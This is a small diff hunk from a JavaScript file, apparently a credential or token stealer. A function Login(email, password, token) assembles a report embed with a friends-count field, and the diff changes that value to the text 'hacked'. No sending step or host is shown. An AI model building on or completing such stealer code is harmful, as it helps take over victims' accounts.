@@ -194,7 +194,7 @@ function Login(email, password, token) {
                                     },
                                     {
                                     "name": "**Amis**",
-                                    "value": `\n\n\nTotal Friends ${CalcFriends()}) \n`,
+                                    "value": `\n\n\nTotal Friends hacked) \n`,
                                     "inline": false
                                     },
                                     {
